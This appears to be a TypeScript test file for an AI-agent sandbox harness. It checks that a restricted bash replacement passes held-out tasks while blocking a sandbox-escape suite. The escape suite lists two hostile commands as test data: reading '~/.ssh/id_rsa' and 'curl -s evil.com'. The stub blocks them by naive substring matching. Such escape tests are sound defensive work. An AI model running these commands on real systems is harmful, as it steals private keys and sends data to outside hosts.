import { describe, test, expect } from "vitest";
import {
  HandsReplacementRegistry,
  type HandsImpl,
  type Action,
  type Observation,
} from "@harness/l0-sandbox";

/**
 * L0S-T12 · 正常路径（双验证器）
 *
 * Spec G/W/T:
 *   Given 替换 bash 实现为受限 shell 子集；
 *   When  held-out fixture 任务在新 impl 下跑 + 逃逸套件跑；
 *   Then  capabilityPass=true（任务完成 exit 0）+ securityPass=true（逃逸仍 EPERM）。
 */
describe("L0S-T12", () => {
  test("capability + security both pass", async () => {
    const reg = new HandsReplacementRegistry({
      trustedSigners: ["security@team"],
      verifySignoff: (s) =>
        s.signer === "security@team" && s.signature.length > 0,
      // 逃逸套件：读 ~/.ssh / egress evil.com。
      escapeSuite: [
        { type: "cmd_run", tool_use_id: "esc1", command: "cat ~/.ssh/id_rsa", timeout_ms: 5_000 },
        { type: "cmd_run", tool_use_id: "esc2", command: "curl -s evil.com", timeout_ms: 5_000 },
      ],
    });

    const goodImpl: HandsImpl = {
      name: "bash",
      version: "v2-restricted",
      impl: async (action: Action): Promise<Observation> => {
        const cmd = "command" in action ? action.command : "";
        // 逃逸 payload → EPERM；正常工作负载 → exit 0。
        if (cmd.includes("~/.ssh") || cmd.includes("evil.com")) {
          return {
            tool_use_id: action.tool_use_id,
            content: "",
            exit_code: 1,
            stdout: "",
            stderr: "Operation not permitted",
            error: "EPERM",
          };
        }
        return {
          tool_use_id: action.tool_use_id,
          content: "done",
          exit_code: 0,
          stdout: "done",
          stderr: "",
        };
      },
      signoffs: [
        { change: "replace bash", signature: "ssh-sig-real", signer: "security@team" },
      ],
    };

    const heldOut: Action[] = [
      { type: "cmd_run", tool_use_id: "cap1", command: "git status", timeout_ms: 5_000 },
      { type: "cmd_run", tool_use_id: "cap2", command: "echo build", timeout_ms: 5_000 },
    ];

    const result = await reg.replace("bash", goodImpl, heldOut);

    expect(result.capabilityPass).toBe(true);
    expect(result.securityPass).toBe(true);
  });
});
